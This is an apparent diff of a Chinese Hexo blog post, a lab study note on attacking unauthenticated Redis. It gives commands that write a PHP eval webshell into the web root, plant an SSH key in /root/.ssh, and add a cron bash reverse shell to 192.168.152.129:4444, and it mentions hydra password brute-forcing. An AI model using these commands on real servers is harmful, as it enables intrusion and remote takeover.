@@ -1,268 +1,281 @@
+
+
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="环境:Ubantu  redis_version:4.0.11  默认端口 :6379安装过程:     REmote DIctionary Server(Redis)是一个key-value数据库info Redis版本和服务器上内核版本信息，以及配置文件绝对路径。 keys * 参考Key值 get key   对应的值flushall 删除所有数据  del key删除键为key的数据 在">
+<html lang="">
+<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta name="description" content="">
+    <title>Redis学习详解 | c1y2m3’blog</title>
+
+    <!-- Open Graph -->
+    <meta name="description" content="&amp;#x73AF;&amp;#x5883;:Ubantu  redis_version:4.0.11  &amp;#x9ED8;&amp;#x8BA4;&amp;#x7AEF;&amp;#x53E3; :6379&amp;#x5B89;&amp;#x88C5;&amp;#x8FC7;&amp;#x7A0B;:     REmote DIctionary Server(Redis)&amp;#x662F;&amp;#x4E00;&amp;#x4E2A;key-value&amp;#x6570;&amp;#x6">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Redis学习详解">
 <meta property="og:url" content="http://yoursite.com/2018/09/26/ redis安全详解/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="环境:Ubantu  redis_version:4.0.11  默认端口 :6379安装过程:     REmote DIctionary Server(Redis)是一个key-value数据库info Redis版本和服务器上内核版本信息，以及配置文件绝对路径。 keys * 参考Key值 get key   对应的值flushall 删除所有数据  del key删除键为key的数据 在">
+<meta property="og:description" content="&amp;#x73AF;&amp;#x5883;:Ubantu  redis_version:4.0.11  &amp;#x9ED8;&amp;#x8BA4;&amp;#x7AEF;&amp;#x53E3; :6379&amp;#x5B89;&amp;#x88C5;&amp;#x8FC7;&amp;#x7A0B;:     REmote DIctionary Server(Redis)&amp;#x662F;&amp;#x4E00;&amp;#x4E2A;key-value&amp;#x6570;&amp;#x6">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab">
 <meta property="og:updated_time" content="2018-11-18T16:41:14.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Redis学习详解">
-<meta name="twitter:description" content="环境:Ubantu  redis_version:4.0.11  默认端口 :6379安装过程:     REmote DIctionary Server(Redis)是一个key-value数据库info Redis版本和服务器上内核版本信息，以及配置文件绝对路径。 keys * 参考Key值 get key   对应的值flushall 删除所有数据  del key删除键为key的数据 在">
+<meta name="twitter:description" content="&amp;#x73AF;&amp;#x5883;:Ubantu  redis_version:4.0.11  &amp;#x9ED8;&amp;#x8BA4;&amp;#x7AEF;&amp;#x53E3; :6379&amp;#x5B89;&amp;#x88C5;&amp;#x8FC7;&amp;#x7A0B;:     REmote DIctionary Server(Redis)&amp;#x662F;&amp;#x4E00;&amp;#x4E2A;key-value&amp;#x6570;&amp;#x6">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15">
+
+    <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "email": "mailto:",
+  "image": "",
+  "name": "John Doe",
+  "url": "http://yoursite.com"
+}
+</script>
+    <script>
+    var algoliaEnabled = false;
+    
+</script>
+
+    
+
     
     
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    
+    
+    
+        <!-- stylesheets list from config.yml -->
         
-          
-              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
-          
+        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
         
+        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
         
-          
-            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
-          
+        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
         
     
-    <!-- title -->
-    <title>Redis学习详解</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
+
 </head>
+<body id="body" style="margin-bottom: 0;" class="pushable">
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </span>
-    <br>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/09/29/ Cobalt Strike学习笔记/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/09/16/【VULNERABLITY】文件上传绕过总结/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/26/ redis安全详解/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/26/ redis安全详解/&text=Redis学习详解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/26/ redis安全详解/&is_video=false&description=Redis学习详解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Redis学习详解&body=Check out this article: http://yoursite.com/2018/09/26/ redis安全详解/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/26/ redis安全详解/&name=Redis学习详解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
-
+    <div class="ui top fixed menu">
+        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#REmote-DIctionary-Server-Redis-是一个key-value数据库"><span class="toc-number">1.</span> <span class="toc-text">REmote DIctionary Server(Redis)是一个key-value数据库</span></a></li></ol><li class="toc-item toc-level-5"><a class="toc-link" href="#在web目录下写入webshell"><span class="toc-number"></span> <span class="toc-text">在web目录下写入webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#写入ssh公钥，获取操作系统权限"><span class="toc-number"></span> <span class="toc-text">写入ssh公钥，获取操作系统权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用hydra暴力破解redis的密码"><span class="toc-number"></span> <span class="toc-text">利用hydra暴力破解redis的密码</span></a>
-    </li></div>
-  </span>
+
+    <div id="menu-sidebar" class="ui left vertical sidebar menu">
+
+    <div id="sidebar-top">
+        <div class="content">
+            <h3>c1y2m3’blog</h3>
+        </div>
+    </div>
+    <div class="ui container sidebar-card">
+    <div class="ui people shape content">
+        <div class="active side">
+            <div class="ui card">
+                <div class="image">
+                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
+                </div>
+                <div class="content">
+                    <a class="header">John Doe</a>
+                    
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                        
+                    </div>
+
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
 </div>
 
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-  <header>
     
-    <h1 class="posttitle" itemprop="name headline">
-        Redis学习详解
-    </h1>
+
+    
+
+    
+    <a href="/index.html" class="item">
+        <i class="home icon"></i>
+        HOME
+    </a>
+
+    
+
+    
+</div>
+
+    <div class="pusher body-content">
+        <div id="content" class="ui main container">
+            <!--<div class="ui one column grid">-->
+                <!--<div class="column">-->
+                    <!--<div class="ui main container">-->
+                        <div id="post- redis安全详解" class="ui main container article-type-post">
+
+    
+
+    <div class="ui divided grid">
+
+        <div class="two column row" id="article-content">
+
+            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
+                
+
+<h1 class="ui header">
+    
+    Redis学习详解
+</h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">c1y2m3’blog</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2018-09-25T16:34:14.000Z" itemprop="datePublished">2018-09-26</time>
-    </div>
+                <div class="article-inner">
 
-
-      
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <ol>
-<li><p>环境:Ubantu  redis_version:4.0.11</p>
+                    <div class="article-entry" itemprop="articleBody">
+                        
+                        <ol class="ui list">
+<li><p>&#x73AF;&#x5883;:Ubantu  redis_version:4.0.11</p>
 <ol start="2">
-<li>默认端口 :6379<br>安装过程:</li>
+<li>&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3; :6379<br>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;:</li>
 </ol>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15" alt=""></p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15"><img src="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15" alt="" class="ui centered image"></a></p>
 </li>
 </ol>
-<h6 id="REmote-DIctionary-Server-Redis-是一个key-value数据库"><a href="#REmote-DIctionary-Server-Redis-是一个key-value数据库" class="headerlink" title="REmote DIctionary Server(Redis)是一个key-value数据库"></a>REmote DIctionary Server(Redis)是一个key-value数据库</h6><p><code>info</code> Redis版本和服务器上内核版本信息，以及配置文件绝对路径。</p>
-<p><code>keys *</code> 参考Key值 <code>get key</code>   对应的值<br><code>flushall</code> 删除所有数据  <code>del key</code>删除键为key的数据</p>
-<h5 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set 1 &quot;test&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<h5 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="写入ssh公钥，获取操作系统权限"></a>写入ssh公钥，获取操作系统权限</h5><p>将本机的公钥作为value，key值随意，然后通过修改数据库默认路径和缓冲文件，把缓冲文件写在文件里，等于在服务端/root/.ssh下生成授权的key.</p>
-<p>客户端生成Key: ssh-keygen -t rsa</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"></span><br><span class="line">把key.txt文件内容写入目标主机的缓冲里：</span><br><span class="line">cat kali.txt|redis-cli -h 127.0.0.1 -x set xxx </span><br><span class="line">OK</span><br><span class="line">设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</span><br><span class="line">redis-cli -h 127.0.0.1 config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">将数据保存在服务器硬盘上</span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
-<p>目标主机查看写入keys内容:</p>
+<h6 id="REmote-DIctionary-Server-Redis-&#x662F;&#x4E00;&#x4E2A;key-value&#x6570;&#x636E;&#x5E93;"><a href="#REmote-DIctionary-Server-Redis-&#x662F;&#x4E00;&#x4E2A;key-value&#x6570;&#x636E;&#x5E93;" class="headerlink" title="REmote DIctionary Server(Redis)&#x662F;&#x4E00;&#x4E2A;key-value&#x6570;&#x636E;&#x5E93;"></a>REmote DIctionary Server(Redis)&#x662F;&#x4E00;&#x4E2A;key-value&#x6570;&#x636E;&#x5E93;</h6><p><code>info</code> Redis&#x7248;&#x672C;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5185;&#x6838;&#x7248;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x53CA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x3002;</p>
+<p><code>keys *</code> &#x53C2;&#x8003;Key&#x503C; <code>get key</code>   &#x5BF9;&#x5E94;&#x7684;&#x503C;<br><code>flushall</code> &#x5220;&#x9664;&#x6240;&#x6709;&#x6570;&#x636E;  <code>del key</code>&#x5220;&#x9664;&#x952E;&#x4E3A;key&#x7684;&#x6570;&#x636E;</p>
+<h5 id="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;webshell"><a href="#&#x5728;web&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;webshell" class="headerlink" title="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;webshell"></a>&#x5728;web&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set 1 &quot;test&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h5 id="&#x5199;&#x5165;ssh&#x516C;&#x94A5;&#xFF0C;&#x83B7;&#x53D6;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6743;&#x9650;"><a href="#&#x5199;&#x5165;ssh&#x516C;&#x94A5;&#xFF0C;&#x83B7;&#x53D6;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6743;&#x9650;" class="headerlink" title="&#x5199;&#x5165;ssh&#x516C;&#x94A5;&#xFF0C;&#x83B7;&#x53D6;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6743;&#x9650;"></a>&#x5199;&#x5165;ssh&#x516C;&#x94A5;&#xFF0C;&#x83B7;&#x53D6;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6743;&#x9650;</h5><p>&#x5C06;&#x672C;&#x673A;&#x7684;&#x516C;&#x94A5;&#x4F5C;&#x4E3A;value&#xFF0C;key&#x503C;&#x968F;&#x610F;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x548C;&#x7F13;&#x51B2;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7F13;&#x51B2;&#x6587;&#x4EF6;&#x5199;&#x5728;&#x6587;&#x4EF6;&#x91CC;&#xFF0C;&#x7B49;&#x4E8E;&#x5728;&#x670D;&#x52A1;&#x7AEF;/root/.ssh&#x4E0B;&#x751F;&#x6210;&#x6388;&#x6743;&#x7684;key.</p>
+<p>&#x5BA2;&#x6237;&#x7AEF;&#x751F;&#x6210;Key: ssh-keygen -t rsa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x5C06;&#x516C;&#x94A5;&#x5BFC;&#x5165;key.txt&#x6587;&#x4EF6;&#xFF08;&#x524D;&#x540E;&#x7528;\n&#x6362;&#x884C;&#xFF0C;&#x907F;&#x514D;&#x548C;Redis&#x91CC;&#x5176;&#x4ED6;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x6DF7;&#x5408;</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"></span><br><span class="line">&#x628A;key.txt&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5199;&#x5165;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x7F13;&#x51B2;&#x91CC;&#xFF1A;</span><br><span class="line">cat kali.txt|redis-cli -h 127.0.0.1 -x set xxx </span><br><span class="line">OK</span><br><span class="line">&#x8BBE;&#x7F6E;redis&#x7684;&#x5907;&#x4EFD;&#x8DEF;&#x5F84;&#x4E3A;/root/.ssh&#x548C;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x540D;authorized_keys</span><br><span class="line">redis-cli -h 127.0.0.1 config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#x786C;&#x76D8;&#x4E0A;</span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x67E5;&#x770B;&#x5199;&#x5165;keys&#x5185;&#x5BB9;:</p>
 <p><code>cat /root/.ssh/authorized_keys</code></p>
-<ul>
+<ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<ul>
-<li>未复现成功。<br>在crontab里写定时任务，反弹shell，原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</li>
+<ul class="ui list">
+<li>&#x672A;&#x590D;&#x73B0;&#x6210;&#x529F;&#x3002;<br>&#x5728;crontab&#x91CC;&#x5199;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#xFF0C;&#x53CD;&#x5F39;shell&#xFF0C;&#x539F;&#x7406;&#x662F;&#x548C;&#x5199;&#x516C;&#x94A5;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x53D8;&#x6362;&#x4E00;&#x4E0B;&#x5199;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x548C;&#x8DEF;&#x5F84;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x540D;&#x3002;</li>
 </ul>
-<p>本机监听:</p>
+<p>&#x672C;&#x673A;&#x76D1;&#x542C;:</p>
 <p><code>nc -l 2222</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">连接redis，写入反弹shell</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<h5 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x8FDE;&#x63A5;redis&#xFF0C;&#x5199;&#x5165;&#x53CD;&#x5F39;shell</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h5 id="&#x5229;&#x7528;hydra&#x66B4;&#x529B;&#x7834;&#x89E3;redis&#x7684;&#x5BC6;&#x7801;"><a href="#&#x5229;&#x7528;hydra&#x66B4;&#x529B;&#x7834;&#x89E3;redis&#x7684;&#x5BC6;&#x7801;" class="headerlink" title="&#x5229;&#x7528;hydra&#x66B4;&#x529B;&#x7834;&#x89E3;redis&#x7684;&#x5BC6;&#x7801;"></a>&#x5229;&#x7528;hydra&#x66B4;&#x529B;&#x7834;&#x89E3;redis&#x7684;&#x5BC6;&#x7801;</h5><p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab"><img src="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab" alt="" class="ui centered image"></a></p>
 
-  </div>
-</article>
+                        
+                    </div>
 
+                    
+                    
+                    
 
+                    <div class="description post-description">
+    <span class="post-description-item">
+        <time datetime="2018-09-25T16:34:14.000Z" itemprop="datePublished">2018-09-26</time>
 
+    </span>
+    <span class="post-description-item">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#REmote-DIctionary-Server-Redis-是一个key-value数据库"><span class="toc-number">1.</span> <span class="toc-text">REmote DIctionary Server(Redis)是一个key-value数据库</span></a></li></ol><li class="toc-item toc-level-5"><a class="toc-link" href="#在web目录下写入webshell"><span class="toc-number"></span> <span class="toc-text">在web目录下写入webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#写入ssh公钥，获取操作系统权限"><span class="toc-number"></span> <span class="toc-text">写入ssh公钥，获取操作系统权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用hydra暴力破解redis的密码"><span class="toc-number"></span> <span class="toc-text">利用hydra暴力破解redis的密码</span></a>
-    </li></div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/26/ redis安全详解/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/26/ redis安全详解/&text=Redis学习详解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/26/ redis安全详解/&is_video=false&description=Redis学习详解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Redis学习详解&body=Check out this article: http://yoursite.com/2018/09/26/ redis安全详解/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/26/ redis安全详解/&title=Redis学习详解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/26/ redis安全详解/&name=Redis学习详解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+    </span>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2019 John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
+                </div>
+                
+                <div id="pagination" class="nav-web ui text container pagination">
+
+    <div class="ui stackable two column divided grid container">
+        <div class="row">
+            <div class="column nav-left">
+                
+
